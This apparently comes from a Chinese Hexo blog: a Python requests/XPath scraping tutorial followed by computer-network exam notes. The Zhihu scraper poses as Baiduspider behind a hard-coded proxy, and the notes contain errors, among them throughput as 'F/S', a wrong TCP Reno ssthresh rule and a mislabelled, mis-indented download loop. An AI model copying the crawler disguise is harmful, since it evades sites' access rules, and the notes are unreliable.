<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'http://httpbin.org/cookies'</span></span><br><span class="line">cookies = dict(cookies_are=<span class="string">'working'</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br></pre></td></tr></table></figure>

+ 编写请求头
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'https://api.github.com/some/endpoint'</span></span><br><span class="line">headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br></pre></td></tr></table></figure></code></pre><ol start="2">
<li><p>从 Response 对象中获取信息</p>
<ul>
<li><p>获取页面</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.text       <span class="comment"># 自动编码</span></span><br><span class="line">r.encoding = <span class="string">'utf-8'</span></span><br><span class="line">r.content    <span class="comment"># 二进制数据</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取响应状态码</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line">r.status_code</span><br><span class="line"><span class="comment"># 200</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取响应头</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.headers</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取二进制文件(如图片)</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">i = Image.open(BytesIO(r.content))</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取 JSON</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(<span class="string">'https://api.github.com/events'</span>)</span><br><span class="line">    r.json()</span><br><span class="line">    <span class="comment"># [&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/...</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'error'</span>)</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ol>
<pre><code>+ 获取 Cookie
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.cookies[<span class="string">'example_cookie_name'</span>]</span><br><span class="line"><span class="comment"># 'example_cookie_value'</span></span><br></pre></td></tr></table></figure>

+ 获取套接字中的 TCP 报文段
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> fd:</span><br><span class="line"><span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size):</span><br><span class="line">    fd.write(chunk)</span><br></pre></td></tr></table></figure></code></pre><h2 id="XPath-解析"><a href="#XPath-解析" class="headerlink" title="XPath 解析"></a>XPath 解析</h2><ul>
<li><p>访问节点</p>
<table>
<thead>
<tr>
<th>路径表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>bookstore</td>
<td>选取 bookstore 元素的所有子节点。</td>
</tr>
<tr>
<td>/bookstore</td>
<td>选取根元素 bookstore。注释：假如路径起始于正斜杠( / )，则此路径始终代表到某元素的绝对路径！</td>
</tr>
<tr>
<td>bookstore/book</td>
<td>选取属于 bookstore 的子元素的所有 book 元素。</td>
</tr>
<tr>
<td>//book</td>
<td>选取所有 book 子元素，而不管它们在文档中的位置。</td>
</tr>
<tr>
<td>bookstore//book</td>
<td>选择属于 bookstore 元素的后代的所有 book 元素，而不管它们位于 bookstore 之下的什么位置。</td>
</tr>
<tr>
<td>//@lang</td>
<td>选取名为 lang 的所有属性。</td>
</tr>
</tbody></table>
</li>
<li><p>使用谓词 <code>[ ]</code>: </p>
</li>
</ul>
<table>
<thead>
<tr>
<th>路径表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/book[1]</td>
<td>选取属于 bookstore 子元素的第一个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[last()]</td>
<td>选取属于 bookstore 子元素的最后一个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[last()-1]</td>
<td>选取属于 bookstore 子元素的倒数第二个 book 元素。</td>
</tr>
<tr>
<td>/bookstore/book[position() &lt; 3]</td>
<td>选取最前面的两个属于 bookstore 元素的子元素的 book 元素。</td>
</tr>
<tr>
<td>//title[@lang]</td>
<td>选取所有拥有名为 lang 的属性的 title 元素。</td>
</tr>
<tr>
<td>//title[@lang=’eng’]</td>
<td>选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]</td>
<td>选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。</td>
</tr>
<tr>
<td>/bookstore/book[price&gt;35.00]/title</td>
<td>选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</td>
</tr>
</tbody></table>
<ul>
<li>选取多个节点:<table>
<thead>
<tr>
<th>路径表达式</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>/bookstore/*</td>
<td>选取 bookstore 元素的所有子元素。</td>
</tr>
<tr>
<td>//*</td>
<td>选取文档中的所有元素。</td>
</tr>
<tr>
<td>//title[@*]</td>
<td>选取所有带有属性的 title 元素。</td>
</tr>
<tr>
<td>//book/title | //book/price</td>
<td>选取 book 元素的所有 title 和 price 元素。</td>
</tr>
<tr>
<td>//title | //price</td>
<td>选取文档中的所有 title 和 price 元素。</td>
</tr>
<tr>
<td>/bookstore/book/title | //price</td>
<td>选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="实例-获取知乎发现上的问题链接"><a href="#实例-获取知乎发现上的问题链接" class="headerlink" title="实例: 获取知乎发现上的问题链接"></a>实例: 获取知乎发现上的问题链接</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'Baiduspider'</span>&#125;</span><br><span class="line">    proxies = &#123;</span><br><span class="line">        <span class="string">'http'</span>: <span class="string">'http://122.114.31.177:808'</span></span><br><span class="line">    &#125;</span><br><span class="line">    base_url = <span class="string">'https://www.zhihu.com/'</span></span><br><span class="line">    seed_url = urljoin(base_url, <span class="string">'explore'</span>) <span class="comment"># https://www.zhihu.com/explore</span></span><br><span class="line">    resp = requests.get(seed_url,</span><br><span class="line">                        headers=headers,</span><br><span class="line">                        proxies=proxies <span class="comment"># 代理</span></span><br><span class="line">            ) </span><br><span class="line">    soup = BeautifulSoup(resp.text, <span class="string">'lxml'</span>)  </span><br><span class="line">    href_regex = re.compile(<span class="string">r'^/question'</span>) <span class="comment"># 正则匹配 /question</span></span><br><span class="line">    link_set = set()</span><br><span class="line">    <span class="keyword">for</span> a_tag <span class="keyword">in</span> soup.find_all(<span class="string">'a'</span>, &#123;<span class="string">'href'</span>: href_regex&#125;):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'href'</span> <span class="keyword">in</span> a_tag.attrs:</span><br><span class="line">            href = a_tag.attrs[<span class="string">'href'</span>]</span><br><span class="line">            full_url = urljoin(base_url, href)</span><br><span class="line">            link_set.add(full_url)</span><br><span class="line">    print(<span class="string">'Total %d question pages found.'</span> % len(link_set))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[计网 summary]]></title>
      <url>/2019/11/05/Computer-network-summary/</url>
      <content type="html"><![CDATA[<p>每天一遍, 预防失眠.</p>
<a id="more"></a>

<h1 id="名词索引表"><a href="#名词索引表" class="headerlink" title="名词索引表"></a>名词索引表</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul>
<li>HTTP<br>HyperText Transfer Protocol 超文本传输协议</li>
<li>SSL<br>Secure Sockets Layer 安全套接层</li>
<li>RTT<br>Round-Trip Time 往返时延</li>
<li>SMTP<br>The Simple Mail Transfer Protocol 简单邮件传输协议</li>
<li>POP<br>Post Office Protocol 邮局协议</li>
<li>IMAP<br>Internet Mail Access Protocol 交互邮件访问协议</li>
<li>DNS<br>domain name system 域名系统</li>
<li>TLD<br>top-level domain 顶级域名服务器</li>
<li>ISP<br>internet Service Provider 互联网服务提供商</li>
<li>P2P<br>peer to peer 对等网络</li>
<li>CBR<br>constant bit rate 静态码率</li>
<li>VBR<br>variable bit rate 动态码率</li>
<li>DASH<br>Dynamic Adaptive Streaming over HTTP 基于HTTP的自适应传输流技术</li>
<li>CDN<br>Content Distribution Networks 内容分发网络</li>
<li>DHCP<br>Dynamic host configuration protocol 动态主机配置协议</li>
</ul>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><ul>
<li>TCP<br>Transmission Control Protocol 传输控制协议</li>
<li>UDP<br>User Datagram Protocol 用户数据报协议</li>
<li>rdt<br>reliable data transfer Protocol 可靠数据传输协议</li>
<li>FSM<br>finite state machines 有限状态机</li>
<li>ACKs<br>acknowledgements 承认</li>
<li>NAKs<br>negative acknowledgements 不承认</li>
<li>GBN<br>Go-Back-N 回退N步</li>
<li>URG<br>urgent data 紧急数据</li>
<li>PSH<br>push data now 立即推送数据</li>
<li>SYN<br>Synchronize Sequence Numbers 同步序列编号</li>
<li>ssthresh<br>slow start threshold 慢启动阈值</li>
</ul>
<h2 id="网络层-The-Data-Plane"><a href="#网络层-The-Data-Plane" class="headerlink" title="网络层 The Data Plane"></a>网络层 The Data Plane</h2><ul>
<li>IP<br>Internet Protocol</li>
<li>ARP<br>Address Resolution Protocol 地址解析协议</li>
<li>ICMP<br>Internet Control Message Protocol 网际控制报文协议</li>
<li>IGMP<br>Internet Group Management Protocol 国际组管理协议</li>
<li>ICANN<br>Internet Corporation for Assigned Names and Numbers 互联网名字和数字分配机构</li>
<li>VLSM<br>Variable Length Subnet Mask 变长子网掩码</li>
<li>CIDR<br>Classless Inter-Domain Routing 无分类域间路由选择</li>
<li>PING<br>Packet InterNet Groper 分组网间探测</li>
<li>AS<br>autonomous system 自治系统</li>
<li>IGP<br>Interior Gateway Protocol 内部网关协议</li>
<li>RIP<br>Routing Information Protocol 路由信息协议</li>
<li>DV<br>distance-vector 距离向量</li>
<li>OSPF<br>Open Shortest Path First 开放最短路径优先</li>
<li>LS<br>link state 链路状态</li>
<li>EGP<br>External Gateway Protocol 外部网关协议</li>
<li>BGP<br>Border gateway Protocol 边界网关协议</li>
<li>SDN<br>Software Defined Network 软件定义网络</li>
</ul>
<h2 id="网络层-The-Control-Plane"><a href="#网络层-The-Control-Plane" class="headerlink" title="网络层 The Control Plane"></a>网络层 The Control Plane</h2><p>// TODO</p>
<h2 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h2><ul>
<li>CRC<br>Cyclic redundancy check 循环冗余校验</li>
<li>ppp<br>point-to-point 点对点协议</li>
<li>MAC<br>Media Access Control 媒体介入控制</li>
<li>TDMA<br>time division multiple access 时分多路访问</li>
<li>FDMA<br>frequency division multiple access 频分多路访问</li>
<li>CSMA<br>carrier sense multiple access 载波侦听多路访问</li>
<li>CSMA/CD<br>carrier sense multiple access/collision detection 载波侦听多路访问／碰撞检测</li>
<li>CSMA/CA<br>Carrier Sense Multiple Access with Collision Avoid 载波侦听多路访问／碰撞避免<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2></li>
</ul>
<h2 id="Other-Name"><a href="#Other-Name" class="headerlink" title="Other Name"></a>Other Name</h2><ul>
<li>NAT<br>Network address Translation 网络地址转换</li>
<li>VLAN<br>Virtual Local Area Network 虚拟局域网</li>
</ul>
<h1 id="考纲"><a href="#考纲" class="headerlink" title="考纲"></a>考纲</h1><h2 id="第一章-计算机网络和Internet"><a href="#第一章-计算机网络和Internet" class="headerlink" title="第一章 计算机网络和Internet"></a>第一章 计算机网络和Internet</h2><h3 id="理解-Internet-层次型网络架构。-（1-1）"><a href="#理解-Internet-层次型网络架构。-（1-1）" class="headerlink" title="理解 Internet 层次型网络架构。 （1.1）"></a>理解 Internet 层次型网络架构。 （1.1）</h3><p>// TODO</p>
<h3 id="深入理解数据交换技术：分组交换（packet-switching）和电路交换-circuit-switching-，基本原理和优缺点。（1-3）"><a href="#深入理解数据交换技术：分组交换（packet-switching）和电路交换-circuit-switching-，基本原理和优缺点。（1-3）" class="headerlink" title="深入理解数据交换技术：分组交换（packet switching）和电路交换(circuit switching)，基本原理和优缺点。（1.3）"></a>深入理解数据交换技术：分组交换（packet switching）和电路交换(circuit switching)，基本原理和优缺点。（1.3）</h3><ul>
<li>分组交换<ul>
<li>基本原理:<br>分组交换是以分组为单位进行传输和交换的，它是一种<strong>存储转发</strong>交换方式，即将到达交换机的分组先送到存储器暂时存储和处理，等到相应的输出电路有空闲时再送出</li>
<li>优点:<ul>
<li>分组交换不需要为通信双反预先建立一条专用的通信线路，不存在连接建立时延，用户可随时发送分组。</li>
<li>由于采用存储转发方式，加之交换节点具有路径选择，当某条传输线路故障时可选择其他传输线路，提高了传输的可靠性。</li>
<li>通信双反不是固定的占有一条通信线路，而是在不同的时间一段一段地部分占有这条物理通路，因而大大提高了通信线路的利用率。</li>
<li>加速了数据在网络中的传输。因而分组是逐个传输，可以使后一个分组的存储操作与前一个分组的转发操作并行，这种流水线式传输方式减少了传输时间。</li>
<li>分组长度固定，相应的缓冲区的大小也固定，所以简化了交换节点中存储器的管理。</li>
<li>分组较短，出错几率减少，每次重发的数据量也减少，不仅提高了可靠性，也减少了时延。</li>
</ul>
</li>
<li>缺点:<ul>
<li>由于数据进入交换节点后要经历存储转发这一过程，从而引起的转发时延（包括接受分组、检验正确性、排队、发送时间等），而且网络的通信量越大，造成的时延就越大，实时性较差。</li>
<li>分组交换只适用于数字信号。</li>
<li>分组交换可能出现失序，丢失或重复分组，分组到达目的节点时，对分组按编号进行排序等工作，增加了麻烦。</li>
<li>分组都要加上源、目的地址和分组编号等信息，使传送的信息量大约增大5%～10%，一定程度上降低了通信效率，增加了处理的时间，使控制复杂，时延增加。</li>
</ul>
</li>
</ul>
</li>
<li>电路交换<ul>
<li>基本原理<br>  电路交换是以电路连接为目的的交换方式，通信之前要在通信双方之间建立一条被<strong>双方独占的物理通道</strong>。</li>
<li>优点: <ul>
<li>由于通信线路为通信双方用户专用，数据直达，所以传输数据的时延非常小。</li>
<li>通信双方之间的屋里通路一旦建立，双方可以随时通信，实时性强。</li>
<li>双方通信时按发送顺序传送数据，不存在失序问题。</li>
<li>电路交换既适用于传输模拟信号，也适用于传输数字信号。</li>
<li>电路交换的交换设备及控制均比较简单。</li>
</ul>
</li>
<li>缺点:<ul>
<li>电路交换平均连接建立时间对计算机通信来说较长。</li>
<li>电路交换家里连接后，物理通路被通信双方独占，即使通信线路空闲，也不能供其他用户使用，因而信道利用率低。</li>
<li>电路交换时，数据直达，不同类型，不同规格，不同速率的终端很难相互进行通信，也难以在通信过程中进行差错控制。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="掌握计算机网络主要性能评价参数的物理含义及计算方法"><a href="#掌握计算机网络主要性能评价参数的物理含义及计算方法" class="headerlink" title="掌握计算机网络主要性能评价参数的物理含义及计算方法"></a>掌握计算机网络主要性能评价参数的物理含义及计算方法</h3><ul>
<li><p>吞吐率（throughput）<br>  <strong>瞬时吞吐量</strong>: 主机接收到文件的速率(以bps计)<br>  <strong>平均吞吐量</strong>: 假设文件由<strong>F比特</strong>组成, 主机接受整个文件用去<strong>T秒</strong>, 平均吞吐量是<strong>F/S bps</strong></p>
</li>
<li><p>延迟(delay)<br>$$总时延 = 传输时延(transmission) + 传播时延(propagation)+ 排队时延(queuing) + 处理时延(processing)$$ </p>
</li>
<li><p>丢包率(loss rate)<br>$$\cfrac{输入报文-输出报文}{输入报文}*100%$$ </p>
</li>
</ul>
<h3 id="能够理解计算机网络协议栈分层设计的方法，每层的名称、主要功能、Internet-对应层的主要协议。（1-5）"><a href="#能够理解计算机网络协议栈分层设计的方法，每层的名称、主要功能、Internet-对应层的主要协议。（1-5）" class="headerlink" title="能够理解计算机网络协议栈分层设计的方法，每层的名称、主要功能、Internet 对应层的主要协议。（1.5）"></a>能够理解计算机网络协议栈分层设计的方法，每层的名称、主要功能、Internet 对应层的主要协议。（1.5）</h3><ol>
<li>OSI七层架构</li>
</ol>
<table>
<thead>
<tr>
<th align="left">a</th>
<th align="left">b</th>
<th align="left">c</th>
</tr>
</thead>
<tbody><tr>
<td align="left">第一层</td>
<td align="left">物理层（physical）（单位类型：比特）</td>
<td align="left">实现比特流的透明传输，物理接口，具有电气特性</td>
</tr>
<tr>
<td align="left">第二层</td>
<td align="left">数据链路层（date link）（单位类型：帧）</td>
<td align="left">访问介质；数据在该层封装成帧；用MAC地址作为访问媒介；具有错误检测与修正功能。MAC描述在共享介质环境中如何进行站的调度、发生和接收数据。MAC确保信息跨链路的可靠传输，对数据传输进行同步，识别错误和控制数据的流向。一般地讲，MAC只在共享介质环境中才是重要的，只有在共享介质环境中多个节点才能连接到同一传输介质上</td>
</tr>
<tr>
<td align="left">第三层</td>
<td align="left">网络层（network）（单位类型：报文）</td>
<td align="left">数据传输；提供逻辑地址，选择路由数据包，负责在源和终点之间建立连接</td>
</tr>
<tr>
<td align="left">第四层</td>
<td align="left">传输层（transport）</td>
<td align="left">实现端到端传输；分可靠与不可靠传输；在传输前实现错误检测与流量控制，定义端口号（标记相应的服务）</td>
</tr>
<tr>
<td align="left">第五层</td>
<td align="left">会话层（session）</td>
<td align="left">主机间通信；对应用会话管理，同步</td>
</tr>
<tr>
<td align="left">第六层</td>
<td align="left">表示层（presention）</td>
<td align="left">数据表现形式；特定功能的实现-比如加密模式确保原始设备上加密的数据可以在目标设备上正确地解密</td>
</tr>
<tr>
<td align="left">第七层</td>
<td align="left">应用层（application）</td>
<td align="left">最接近终端用户的OSI层，这就意味着OSI应用层与用户之间是通过应用软件直接相互作用的。网络进程访问应用层；提供接口服务</td>
</tr>
</tbody></table>
<ol start="2">
<li>TCP/IP四层架构</li>
</ol>
<table>
<thead>
<tr>
<th align="left">a</th>
<th align="left">b</th>
<th align="left">c</th>
</tr>
</thead>
<tbody><tr>
<td align="left">第四层</td>
<td align="left">应用层</td>
<td align="left">TCP/IP协议的应用层相当于OSI模型的会话层、表示层和应用层，FTP(文件传输协议)，DNS（域名系统），HTTP协议，Telnet（网络远程访问协议）</td>
</tr>
<tr>
<td align="left">第三层</td>
<td align="left">传输层</td>
<td align="left">提供TCP(传输控制协议)，UDP（用户数据报协议）两个协议，主要功能是数据格式化、数据确认和丢失重传等。</td>
</tr>
<tr>
<td align="left">第二层</td>
<td align="left">网络层</td>
<td align="left">该层负责相同或不同网络中计算机之间的通信主要处理数据包和路由。数据包是网络传输的最小数据单位。通过某条传输路线将数据包传给对方。IP协议,ICMP协议，IGMP协议。在IP层中，ARP协议用于将IP地址转换成物理地址，ICMP协议用于报告差错和传送控制信息。IP协议在TCP/IP协议组中处于核心地位。</td>
</tr>
<tr>
<td align="left">第一层</td>
<td align="left">网络接口层</td>
<td align="left">TCP/IP协议的最低一层，对实际的网络媒体的管理，包括操作系统中的设备驱动程序和计算机对应的网络接口卡</td>
</tr>
</tbody></table>
<ol start="3">
<li>TCP/IP五层架构</li>
</ol>
<table>
<thead>
<tr>
<th align="left">a</th>
<th align="left">b</th>
<th align="left">c</th>
</tr>
</thead>
<tbody><tr>
<td align="left">第五层</td>
<td align="left">应用层 单位:报文(message)</td>
<td align="left">应用层是网络应用程序及它们的应用层协议存留的地方</td>
</tr>
<tr>
<td align="left">第四层</td>
<td align="left">运输层 单位:报文段(segment)</td>
<td align="left">因特网的运输层在应用程序端点之间传送应用层报文. 有两种运输层协议TCP和UDP</td>
</tr>
<tr>
<td align="left">第三层</td>
<td align="left">网络层 单位:数据报(datagram)</td>
<td align="left">负责将名为数据报的网络层分组从一台主机移动到另一台主机</td>
</tr>
<tr>
<td align="left">第二层</td>
<td align="left">链路层 单位:帧(frame)</td>
<td align="left">将整个帧从一个网络元素移动到邻近的网络元素</td>
</tr>
<tr>
<td align="left">第一层</td>
<td align="left">物理层 单位:比特(bit)</td>
<td align="left">将帧中的一个个比特从一个节点移动到下一个节点</td>
</tr>
</tbody></table>
<h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章 应用层"></a>第二章 应用层</h2><h3 id="掌握应用层在网络协议栈中的位置及主要功能"><a href="#掌握应用层在网络协议栈中的位置及主要功能" class="headerlink" title="掌握应用层在网络协议栈中的位置及主要功能"></a>掌握应用层在网络协议栈中的位置及主要功能</h3><p>略</p>
<h3 id="理解应用层协议的两种架构"><a href="#理解应用层协议的两种架构" class="headerlink" title="理解应用层协议的两种架构"></a>理解应用层协议的两种架构</h3><ul>
<li>C/S架构<br>  在客户-服务器体系结构中, 有一个总是打开的主机称为服务器, 它服务于来自许多其他称为客户的主机的请求.</li>
<li>P2P<br>  在一个P2P体系结构中, 对位于数据中心的专用服务器有最小(或者没有)依赖, 相反, 应用程序在间断连接的主机对之间使用直接通信, 这些主机对被称为对等方. 因为这种对等方通信不必通过专门的服务器, 该体系结构被称为对等方到对等方的.</li>
</ul>
<h3 id="熟练掌握-HTTP-协议设计基本原理，两种工作机制：持续性（persistent）和非持续性（non-persistent）的传输延迟的性能分析"><a href="#熟练掌握-HTTP-协议设计基本原理，两种工作机制：持续性（persistent）和非持续性（non-persistent）的传输延迟的性能分析" class="headerlink" title="熟练掌握 HTTP 协议设计基本原理，两种工作机制：持续性（persistent）和非持续性（non-persistent）的传输延迟的性能分析"></a>熟练掌握 HTTP 协议设计基本原理，两种工作机制：持续性（persistent）和非持续性（non-persistent）的传输延迟的性能分析</h3><ul>
<li>非持续连接的缺点:<ul>
<li>必须为每一个请求的对象建立和维护一个全新的连接, 给Web服务器带来了严重的负担</li>
<li>每一个对象经受两倍的RTT的交付时延, 一个用于创建TCP, 另一个用于请求和接收一个对象</li>
</ul>
</li>
</ul>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><ul>
<li>为何采用分布式数据库<br>  集中式设计的问题包括:<ul>
<li>单点故障: 如果该DNS服务器崩溃, 整个因特网随之瘫痪</li>
<li>通信容量: 单个DNS服务器将处理所有的DNS查询</li>
<li>远距离的集中式数据库: 距离较远的主机查询会导致严重的时延</li>
<li>维护: 此中央数据库庞大, 且需要频繁更新</li>
</ul>
</li>
<li>递归查询和迭代查询<br>  通常从主机到本地DNS服务器的查询是递归的, 其余的查询是迭代的.</li>
</ul>
<h2 id="第三章-传输层"><a href="#第三章-传输层" class="headerlink" title="第三章 传输层"></a>第三章 传输层</h2><h3 id="理解传输层在网络协议栈中的位置及主要功能"><a href="#理解传输层在网络协议栈中的位置及主要功能" class="headerlink" title="理解传输层在网络协议栈中的位置及主要功能"></a>理解传输层在网络协议栈中的位置及主要功能</h3><p>略</p>
<h3 id="熟练掌握经典的可靠数据传输协议的工作原理"><a href="#熟练掌握经典的可靠数据传输协议的工作原理" class="headerlink" title="熟练掌握经典的可靠数据传输协议的工作原理"></a>熟练掌握经典的可靠数据传输协议的工作原理</h3><ul>
<li>停等ARQ(stop and wait)<br>  每发送完一个分组就停止发送 ，等待对方的确认，在收到确认后再发送下一个分组。出现差错时需进行超时重传，这时就要附加一个超时计时器，超出一定时间判定数据丢失进行重传；出现确认丢失时，重传数据，B收到数据后丢弃并重传确认信号；出现确认迟到时，重传数据，A收到第二个确认信号时将其丢弃。<br>  <strong>缺点</strong>是较长的等待时间导致低的数据传输速度。在低速传输时，对连接频道的利用率比较好，但是在高速传输时，频道的利用率会显著下降。</li>
<li>连续ARQ(Automatic Repeat-reQuest)<ul>
<li>回退N步(Go Back N, GBN)<br>  也常被称为<strong>滑动窗口协议</strong>接收点丢弃从第一个没有收到的数据包开始的所有数据包, 发送点收到NACK后，从NACK中指明的数据包开始重新发送。<br>  注: Nack中的N应该是指exceptedseqnum</li>
<li>选择重传(Selective Repeat, SR)<br>  发送点连续发送数据包但对每个数据包都设有个一个计时器。当在一定时间内没有收到某个数据包的ACK时，发送点只重新发送那个没有ACK的数据包。</li>
<li><h3 id="RTT（Round-Trip-Time）的估计方法和超时时长（Timeout）的设置"><a href="#RTT（Round-Trip-Time）的估计方法和超时时长（Timeout）的设置" class="headerlink" title="RTT（Round Trip Time）的估计方法和超时时长（Timeout）的设置"></a>RTT（Round Trip Time）的估计方法和超时时长（Timeout）的设置</h3></li>
</ul>
</li>
<li>RTT估计方法:<br>  $$EstimatedRTT = (1-\alpha)\cdot EstimatedRTT + \alpha \cdot SampleRTT$$<br>  其中$\alpha$的推荐值是$\alpha = \frac{1}{8}$</li>
<li>超时时长设置<br>  首先定义RTT的变化:<br>  $$DevRTT = (1-\beta)\cdot DevRTT+\beta \cdot |SampleRTT - EstimatedRTT| $$<br>  其中$\beta$的推荐值是$\beta = \frac{1}{4}$<br>  其次是确定重传超时间隔:<br>  $$TimeoutInterval = EstimatedRTT + 4\cdot DevRTT$$<br>  <strong>当出现超时后, TimeoutInterval的值将加倍</strong><h3 id="熟练掌握-TCP-RENO-拥塞控制的过程能够判断在不同事件（超时、收到三次重复-ACK-包）发生时-TCP-如何做拥塞窗口调整"><a href="#熟练掌握-TCP-RENO-拥塞控制的过程能够判断在不同事件（超时、收到三次重复-ACK-包）发生时-TCP-如何做拥塞窗口调整" class="headerlink" title="熟练掌握 TCP RENO 拥塞控制的过程能够判断在不同事件（超时、收到三次重复 ACK 包）发生时 TCP 如何做拥塞窗口调整"></a>熟练掌握 TCP RENO 拥塞控制的过程能够判断在不同事件（超时、收到三次重复 ACK 包）发生时 TCP 如何做拥塞窗口调整</h3></li>
</ul>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/reno_tahoe.jpg" alt title class>
                <p></p>
            </figure>
<p>[1, 4] : 慢启动<br>[4, 8] : 拥塞避免<br>在 t=9 时刻, 发生了乱序(产生了三个重复的ACK包), 因为Reno在t=9时刻, ssthresh = ssthresh/2 + 3<br><strong>如果发生超时丢包, 即使是Reno算法, 拥塞窗口被置为1, ssthresh=ssthresh/2</strong></p>
<h3 id="能够理解-TCP-连接建立和拆除的工作流程及原因"><a href="#能够理解-TCP-连接建立和拆除的工作流程及原因" class="headerlink" title="能够理解 TCP 连接建立和拆除的工作流程及原因"></a>能够理解 TCP 连接建立和拆除的工作流程及原因</h3><figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/connect.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/close.png" alt title class>
                <p></p>
            </figure>

